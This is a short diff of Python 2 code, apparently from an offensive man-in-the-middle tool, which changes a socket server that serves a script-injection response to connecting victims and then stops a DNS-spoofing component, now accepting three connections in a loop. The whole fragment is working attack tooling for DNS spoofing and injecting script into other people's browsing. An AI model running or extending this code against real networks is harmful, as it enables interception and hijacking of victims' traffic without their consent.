@@ -66,13 +66,15 @@ Content-Type: text/html
 		print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
 		server.bind(server_address)
 		server.listen(1)
-		try:
-			connection,client_address = server.accept()
-			connection.send("%s" % self.response)
-			print "[+] Script Injected on: ", client_address
-			connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
-			connection.close()
-		except KeyboardInterrupt:
-			server.close()
-		self.dnsspoof.stop()
+		for i in range (0,3):
+			if i >= 2:
+				print "[+] Script Injected on: ", client_address
+				self.dnsspoof.stop()
+			try:
+				connection,client_address = server.accept()
+				connection.send("%s" % self.response)
+				connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
+				connection.close()
+			except KeyboardInterrupt:
+				server.close()
 
